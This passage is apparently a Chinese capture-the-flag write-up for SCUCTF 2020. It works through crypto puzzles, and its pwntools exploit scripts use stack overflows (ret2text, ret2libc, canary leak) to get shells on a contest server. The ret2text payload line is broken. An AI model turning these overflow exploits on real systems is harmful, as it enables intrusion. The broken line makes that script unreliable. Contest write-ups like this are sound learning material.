class="headerlink" title="CRYPTO"></a>CRYPTO</h2><hr><h3 id="1-classic-1"><a href="#1-classic-1" class="headerlink" title="1.classic_1"></a>1.classic_1</h3><p>cipher = fphpgs{u3yy0_gu15_v5_gur_j0eyq_bs_py4ffvp_Pelcgb}<br>凯撒密码,位移是13</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scuctf&#123;h3ll0_th15_i5_the_w0rld_of_cl4ssic_Crypto&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="2-classic-2"><a href="#2-classic-2" class="headerlink" title="2.classic_2"></a>2.classic_2</h3><p>多重编码<br>hex-&gt;base64-&gt;摩斯密码<br>解出:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scuctf%u7b041918fc1ef6348768578f505f69d197%u7d</span><br></pre></td></tr></table></figure><p>这里需要将%u7b改成:”{“ %u7d改成”}”,得到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scuctf&#123;041918fc1ef6348768578f505f69d197&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="3-RSA-1"><a href="#3-RSA-1" class="headerlink" title="3.RSA_1"></a>3.RSA_1</h3><p>e = 3,该题为低加密指数攻击<br>使用脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># 读入 n, 密文</span></span><br><span class="line">n = <span class="number">17076697689025821279984148703479525857912324396375097877800474725170566885465833732966897433803722770843910606215420934526050277173030062927090405120718833473629930226217051580832179577629652910778242159108718885516149768995851175071714817922775555170553827627677999093195969471873530031984433631909841287167351534954860426002075822101506835880510505034002629168205724869128357383388034971402180363910826536064357845040799329301895842061729319929568340334416516796267886218679042058969927331452548377324349084816441144473807565907927986545026739667157223640848553663532280797054758912745891410981282851031085852562257</span></span><br><span class="line">c = <span class="number">892408374578063131162925795619920779766603018609992406621503024400320421262482556891045333045408815199768659578199823419716777827460090306221618906101139272423449131313434967763664295600593363990276765767066758967765012850672428517786210813209127040442832574380675662826137452780727264357</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n=&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c=&#x27;</span>, c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]Detecting m...&#x27;</span></span><br><span class="line">result = gmpy2.iroot(c, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;  [-]The c has cubic root?&#x27;</span>, result[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> result[<span class="number">1</span>]: <span class="built_in">print</span> <span class="string">&#x27;  [-]The m is:&#x27;</span>, <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(result[<span class="number">0</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!]All Done!&#x27;</span></span><br></pre></td></tr></table></figure><p>得到flag:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/cry3.1.png"></p><hr><h3 id="4-RSA-2"><a href="#4-RSA-2" class="headerlink" title="4.RSA_2"></a>4.RSA_2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c = <span class="number">7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239</span></span><br><span class="line">n = <span class="number">21280377217500047527333756734822477656202976970565771310208586426341167199342722337358334403397116963913950346969157</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"><span class="comment"># e = 65,537</span></span><br></pre></td></tr></table></figure><p>对n进行分解,得到三个质因子</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa2.1.png"></p><p>按照RSA加密原理进行解密,编写脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p1 = <span class="number">199045230832669039221046041578658179479</span></span><br><span class="line">p2 = <span class="number">319438022064098846441615805897528174851</span></span><br><span class="line">p3 = <span class="number">334688613728124045578795340681788885633</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">7162732898109470668490761172640544970587920562229245172318483665877098759808623298921271357899945260719802967519239</span></span><br><span class="line">n = <span class="number">21280377217500047527333756734822477656202976970565771310208586426341167199342722337358334403397116963913950346969157</span></span><br><span class="line">fai = (p1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>) * (p3 - <span class="number">1</span>)</span><br><span class="line">d = inverse(e, fai)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"><span class="comment"># scuctf&#123;e063d03aff353073c24617bd4b483f90&#125;</span></span><br></pre></td></tr></table></figure><hr><h3 id="5-math-1"><a href="#5-math-1" class="headerlink" title="5.math_1"></a>5.math_1</h3><p>考察中国剩余定理,脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># prime_list = []</span></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># while (i&lt;100):</span></span><br><span class="line"><span class="comment">#     p = getPrime(256)</span></span><br><span class="line"><span class="comment">#     if p not in prime_list:</span></span><br><span class="line"><span class="comment">#         prime_list.append(p)</span></span><br><span class="line"><span class="comment">#         i += 1</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># c_list = []</span></span><br><span class="line"><span class="comment"># i = 0</span></span><br><span class="line"><span class="comment"># for i in range(100):</span></span><br><span class="line"><span class="comment">#     r = random.randint(1, prime_list[i])</span></span><br><span class="line"><span class="comment">#     c_list.append(r)</span></span><br><span class="line"></span><br><span class="line">result = <span class="number">0</span></span><br><span class="line">prime_list = [...]</span><br><span class="line">c_list = [...]</span><br><span class="line"></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">m = <span class="number">1</span></span><br><span class="line">MR = []</span><br><span class="line">M = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    m *= prime_list[i]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    M.append(m // prime_list[i])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    MR.append(inverse((M[i]), prime_list[i]))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    x += M[i] * MR[i] * c_list[i]</span><br><span class="line">result = x % m</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    f = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        <span class="keyword">if</span> result % prime_list[i] != c_list[i]:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&quot;flag is scuctf&#123;%d&#125;&quot;</span> % (result % <span class="number">1145141145141145141145141919810</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="number">1</span></span><br><span class="line"><span class="comment"># flag is scuctf&#123;234970795255267031279059393553&#125;</span></span><br></pre></td></tr></table></figure><hr><h3 id="6-RSA-3"><a href="#6-RSA-3" class="headerlink" title="6.RSA_3"></a>6.RSA_3</h3><p>本题与RSA_1一样,m=3,都是低加密指数攻击,使用脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"><span class="comment"># 读入 n, 密文</span></span><br><span class="line">n= <span class="number">91271647735744709097708757371810693819959773890255602892321052899291140524662404139036987856738557165460502348870154514187118388083897953512262523467951513248663220055679646915049292032986252072883347567763269025940548912246834125522235064649335386094011441612211361270863086815851273615300955370973053395447</span></span><br><span class="line">c= <span class="number">8473924177689385097361186953656797062650227841190040965380473377780644233766714939608585534305414668494659709275756172697799483669925043356688884324887478394528746881611781366747757023562008158800275672858865552852268001893</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;n=&#x27;</span>, n</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;c=&#x27;</span>, c</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[+]Detecting m...&#x27;</span></span><br><span class="line">result = gmpy2.iroot(c, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;  [-]The c has cubic root?&#x27;</span>, result[<span class="number">1</span>]</span><br><span class="line"><span class="keyword">if</span> result[<span class="number">1</span>]: <span class="built_in">print</span> <span class="string">&#x27;  [-]The m is:&#x27;</span>, <span class="string">&#x27;&#123;:x&#125;&#x27;</span>.<span class="built_in">format</span>(result[<span class="number">0</span>]).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;[!]All Done!&#x27;</span></span><br></pre></td></tr></table></figure><p>得到flag:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/crypto/rsa3.png"></p><hr><h3 id="7-math-2"><a href="#7-math-2" class="headerlink" title="7.math_2"></a>7.math_2</h3><p>本题为求解二次剩余方程,谷歌后找到了一个脚本:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">求解二次剩余的根</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_quadratic_field</span>(<span class="params">d, modulo=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate quadratic field number class</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        class -- quadratic field number class</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> (<span class="built_in">isinstance</span>(modulo, <span class="built_in">int</span>) <span class="keyword">and</span> modulo &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">QuadraticFieldNumber</span>:</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, x, y</span>):</span></span><br><span class="line">            self.x = x % modulo</span><br><span class="line">            self.y = y % modulo</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__mul__</span>(<span class="params">self, another</span>):</span></span><br><span class="line">            x = self.x * another.x + d * self.y * another.y</span><br><span class="line">            y = self.x * another.y + self.y * another.x</span><br><span class="line">            <span class="keyword">return</span> self.__class__(x, y)</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__pow__</span>(<span class="params">self, exponent</span>):</span></span><br><span class="line">            result = self.__class__(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">if</span> exponent:</span><br><span class="line">                temporary = self.__class__(self.x, self.y)</span><br><span class="line">                <span class="keyword">while</span> exponent:</span><br><span class="line">                    <span class="keyword">if</span> exponent &amp; <span class="number">1</span>:</span><br><span class="line">                        result *= temporary</span><br><span class="line">                    temporary *= temporary</span><br><span class="line">                    exponent &gt;&gt;= <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__str__</span>(<span class="params">self</span>):</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;(&#123;&#125;, &#123;&#125; \\sqrt(&#123;&#125;))&#x27;</span>.<span class="built_in">format</span>(self.x, self.y, d)</span><br><span class="line">    <span class="keyword">return</span> QuadraticFieldNumber</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square_root_of_quadratic_residue</span>(<span class="params">n, modulo</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Square root of quadratic residue</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    Solve the square root of quadratic residue using Cipolla&#x27;s algorithm with Legendre symbol</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        int -- if n is a quadratic residue,</span></span><br><span class="line"><span class="string">                   return x, such that x^&#123;2&#125; = n (mod modulo)</span></span><br><span class="line"><span class="string">               otherwise, return -1</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> modulo == <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> n % modulo == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    Legendre = <span class="keyword">lambda</span> n: <span class="built_in">pow</span>(n, modulo - <span class="number">1</span> &gt;&gt; <span class="number">1</span>, modulo)</span><br><span class="line">    <span class="keyword">if</span> Legendre(n) == modulo - <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> Legendre(t ** <span class="number">2</span> - n) != modulo - <span class="number">1</span>:</span><br><span class="line">        t += <span class="number">1</span></span><br><span class="line">    w = (t ** <span class="number">2</span> - n) % modulo</span><br><span class="line">    <span class="keyword">return</span> (generate_quadratic_field(w, modulo)(t, <span class="number">1</span>) ** (modulo + <span class="number">1</span> &gt;&gt; <span class="number">1</span>)).x</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = square_root_of_quadratic_residue(<span class="number">11451419198101926081719260817111</span>,<span class="number">8497980875583539713991243773941802042180496489377326522174599746685528850719812035800799014030522052269804143947777659192760008656733593814889715667890907</span>)</span><br><span class="line">    print(result)</span><br><span class="line">    print(<span class="string">&quot;flag is scuctf&#123;%d&#125;&quot;</span> % (result % <span class="number">1145141145141145141145141919810</span>))</span><br><span class="line"><span class="comment"># 732801025780658791900010899303199208933111943525875138490440727430546888153518985058336834409501987347490118623489611480915480075486097312160196897614257</span></span><br><span class="line"><span class="comment"># flag is scuctf&#123;362832854211699327118018596457&#125;</span></span><br></pre></td></tr></table></figure><hr><h3 id="8-baby-pad"><a href="#8-baby-pad" class="headerlink" title="8.baby_pad"></a>8.baby_pad</h3><p>观察pad方法和输出的密文,在pad函数在M后面加上了0x05个0x05,故先将cipher从十六进制字符串转转成字符串,然后使用切片切掉后5个字符得到M,再将M与key进行异或得到flag,编写脚本如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">M</span>):</span></span><br><span class="line">    pad_length = <span class="number">16</span> - <span class="built_in">len</span>(M) % <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> M.decode() + <span class="built_in">chr</span>(pad_length) * pad_length</span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;x&#x27;</span> * <span class="built_in">len</span>(flag)</span><br><span class="line">print(<span class="built_in">len</span>(flag))</span><br><span class="line">cipher = pad(strxor(flag, key))</span><br><span class="line">print(cipher.encode().<span class="built_in">hex</span>())</span><br><span class="line"><span class="comment"># cipher = 0b1b0d1b0c1e031d190b01270c0a111b13131313050505050505050505050505</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&#x27;0b1b0d1b0c1e031d190b01270c0a111b13131313050505050505050505050505&#x27;</span></span><br><span class="line">s = <span class="built_in">bytes</span>.fromhex(res).decode()</span><br><span class="line">print(<span class="built_in">len</span>(s))</span><br><span class="line">t = s[:-<span class="number">5</span>].encode()</span><br><span class="line">key1 = <span class="string">b&#x27;x&#x27;</span>*<span class="built_in">len</span>(t)</span><br><span class="line">print(strxor(t,key1))</span><br><span class="line"><span class="comment"># b&#x27;scuctf&#123;easy_trickkkk&#125;&#125;&#125;&#125;&#125;&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><hr><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="1-nc"><a href="#1-nc" class="headerlink" title="1.nc"></a>1.nc</h3><p>在linux终端 nc 121.196.34.30 10004</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/nc.png"></p><hr><h3 id="2-ret2text"><a href="#2-ret2text" class="headerlink" title="2.ret2text"></a>2.ret2text</h3><p>查看关键函数,可见s申请的空间为0x10:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.2.png"></p><p>gdb调试查看偏移量,所以偏移量就是0x10:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.4.png"></p><p>找到后门函数success的地址:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn2.3.png"></p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>,<span class="string">&#x27;10007&#x27;</span>)</span><br><span class="line">back_door = <span class="number">0x04007A5</span></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + p64</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="raw"><a href="#raw" class="headerlink" title="raw"></a>raw</h2><h3 id="3-ret2libc"><a href="#3-ret2libc" class="headerlink" title="3.ret2libc"></a>3.ret2libc</h3><p>先查看保护情况:</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.1.png"></p><p>查看偏移量,故偏移量为buf申请的空间加上rbp的8个字节:0x70+0x08=120</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.2.png"></p><p>因为是64位的程序,使用寄存器传递参数,通过pop指令来向寄存器中传值,查找rdi的地址</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.3.png"></p><p>查看bin/sh的地址</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.4.png"></p><p>查看system函数的地址</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn3.5.png"></p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>,<span class="string">&#x27;10005&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">sh, payload</span>):</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br><span class="line">    </span><br><span class="line">system_addr = <span class="number">0x04006D0</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x04009f3</span></span><br><span class="line">binsh_addr = <span class="number">0x0400A14</span> </span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>* <span class="number">120</span> + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line">pwn(sh, payload) </span><br></pre></td></tr></table></figure><hr><h3 id="5-baby-canary"><a href="#5-baby-canary" class="headerlink" title="5.baby_canary"></a>5.baby_canary</h3><p>查看保护情况</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.1.png"></p><p>可以知道v6就是canary,计算buf到v6的偏移量为0x28-0x18=24,还要覆盖rbp的0x08个字节</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/pwn/pwn4.2.png"></p><p>编写exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;/home/icey/canarys/canary&quot;</span></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>,<span class="string">&#x27;10000&#x27;</span>)</span><br><span class="line">get_shell = ELF(path).sym[<span class="string">&quot;success&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;length?\n&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;32&quot;</span>) <span class="comment"># 发送32(大于24小于32)通过验证,并可以使返回数据时不发生EOF异常</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;what?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line">Canary = u64(io.recv(<span class="number">8</span>)) -<span class="number">0xa</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">24</span>+p64(Canary)+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(get_shell)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="1-easy-encode"><a href="#1-easy-encode" class="headerlink" title="1.easy_encode"></a>1.easy_encode</h3><p>仅有scu、401两种组成编码,猜测是摩斯密码 写程序输出摩斯密码格式:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>): </span><br><span class="line">s = f.readline() </span><br><span class="line">s = s.replace(<span class="string">&#x27;401&#x27;</span>, <span class="string">&#x27;.&#x27;</span>) <span class="comment"># long </span></span><br><span class="line">s = s.replace(<span class="string">&#x27;SCU&#x27;</span>, <span class="string">&#x27;_&#x27;</span>) <span class="comment"># short </span></span><br><span class="line">s = s.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/&#x27;</span>) </span><br><span class="line">s = s.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line"><span class="built_in">print</span> s[:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>在线网站解密得到flag</p><hr><h3 id="2-excalibur"><a href="#2-excalibur" class="headerlink" title="2.excalibur"></a>2.excalibur</h3><p>java反编译,得到flag</p><p><img src="https://gitee.com/see1c3y/scuctf2020/raw/master/misc/misc2.png"></p><hr><h3 id="3-签到题"><a href="#3-签到题" class="headerlink" title="3.签到题"></a>3.签到题</h3><hr><h3 id="4-问卷"><a href="#4-问卷" class="headerlink" title="4.问卷"></a>4.问卷</h3><hr><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><hr><h3 id="1-真的是签到题"><a href="#1-真的是签到题" class="headerlink" 